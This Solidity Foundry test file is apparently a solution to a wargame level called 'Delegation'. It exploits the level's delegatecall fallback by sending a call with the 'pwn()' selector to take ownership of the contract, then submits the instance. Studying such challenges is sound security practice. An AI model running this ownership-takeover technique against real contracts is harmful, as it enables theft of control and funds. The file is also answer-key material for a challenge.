// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract DelegationTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xF781b45d11A37c51aabBa1197B61e6397aDf1f78);
  }

  function testExploit() public {
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("pwn()"));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
